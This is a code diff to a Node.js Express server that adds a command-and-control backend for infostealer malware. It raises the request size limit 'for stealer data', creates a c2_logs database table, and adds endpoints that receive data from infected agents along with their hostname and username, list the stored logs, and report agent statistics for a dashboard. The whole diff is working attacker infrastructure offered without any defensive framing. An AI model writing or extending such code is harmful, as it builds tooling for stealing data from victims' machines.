@@ -13,7 +13,7 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = 3002;
 
-app.use(express.json()); // Add JSON body parser
+app.use(express.json({ limit: '50mb' })); // Increase payload limit for stealer data
 app.use(cors({
   origin: "http://localhost:5173",
   credentials: true,
@@ -53,6 +53,22 @@ async function initDatabase() {
         mode VARCHAR(50),
         ns VARCHAR(255),
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+
+    // Create c2_logs table for stealer data
+    await conn.query(`
+      CREATE TABLE IF NOT EXISTS c2_logs (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        agent_id VARCHAR(255) NOT NULL,
+        hostname VARCHAR(255) NOT NULL,
+        username VARCHAR(255) NOT NULL,
+        log_type VARCHAR(100) NOT NULL,
+        data JSON NOT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        INDEX idx_agent_id (agent_id),
+        INDEX idx_log_type (log_type),
+        INDEX idx_created_at (created_at)
       )
     `);
   } finally {
@@ -175,6 +191,122 @@ app.get("/api/admin/users", async (req, res) => {
     res.status(500).json({ error: "Internal server error" });
   } finally {
     conn.release();
+  }
+});
+
+// C2 Log endpoint for stealer data
+app.post("/api/c2/log", async (req, res) => {
+  try {
+    const { agent_id, hostname, username, log_type, data } = req.body;
+    
+    if (!agent_id || !hostname || !username || !log_type || !data) {
+      return res.status(400).json({ error: "Missing required fields" });
+    }
+    
+    const conn = await pool.getConnection();
+    try {
+      await conn.query(
+        `INSERT INTO c2_logs (agent_id, hostname, username, log_type, data) 
+         VALUES (?, ?, ?, ?, ?)`,
+        [agent_id, hostname, username, log_type, JSON.stringify(data)]
+      );
+      
+      console.log(`[C2] Received ${log_type} data from ${agent_id}`);
+      res.json({ success: true });
+      
+    } finally {
+      conn.release();
+    }
+    
+  } catch (err) {
+    console.error("Error processing C2 log:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Get C2 logs (for dashboard)
+app.get("/api/c2/logs", async (req, res) => {
+  try {
+    const { agent_id, log_type, limit = 100, offset = 0 } = req.query;
+    
+    const conn = await pool.getConnection();
+    try {
+      let query = "SELECT * FROM c2_logs WHERE 1=1";
+      let params = [];
+      
+      if (agent_id) {
+        query += " AND agent_id = ?";
+        params.push(agent_id);
+      }
+      
+      if (log_type) {
+        query += " AND log_type = ?";
+        params.push(log_type);
+      }
+      
+      query += " ORDER BY created_at DESC LIMIT ? OFFSET ?";
+      params.push(parseInt(limit), parseInt(offset));
+      
+      const [rows] = await conn.query(query, params);
+      
+      // Parse JSON data for each log
+      const logs = rows.map(row => ({
+        ...row,
+        data: JSON.parse(row.data)
+      }));
+      
+      res.json(logs);
+      
+    } finally {
+      conn.release();
+    }
+    
+  } catch (err) {
+    console.error("Error fetching C2 logs:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Get C2 statistics (for dashboard)
+app.get("/api/c2/stats", async (req, res) => {
+  try {
+    const conn = await pool.getConnection();
+    try {
+      // Get total logs count
+      const [totalRows] = await conn.query("SELECT COUNT(*) as total FROM c2_logs");
+      
+      // Get unique agents count
+      const [agentsRows] = await conn.query("SELECT COUNT(DISTINCT agent_id) as agents FROM c2_logs");
+      
+      // Get logs by type
+      const [typeRows] = await conn.query(`
+        SELECT log_type, COUNT(*) as count 
+        FROM c2_logs 
+        GROUP BY log_type 
+        ORDER BY count DESC
+      `);
+      
+      // Get recent activity (last 24 hours)
+      const [recentRows] = await conn.query(`
+        SELECT COUNT(*) as recent 
+        FROM c2_logs 
+        WHERE created_at >= DATE_SUB(NOW(), INTERVAL 24 HOUR)
+      `);
+      
+      res.json({
+        total_logs: totalRows[0].total,
+        unique_agents: agentsRows[0].agents,
+        logs_by_type: typeRows,
+        recent_activity: recentRows[0].recent
+      });
+      
+    } finally {
+      conn.release();
+    }
+    
+  } catch (err) {
+    console.error("Error fetching C2 stats:", err);
+    res.status(500).json({ error: "Internal server error" });
   }
 });
 
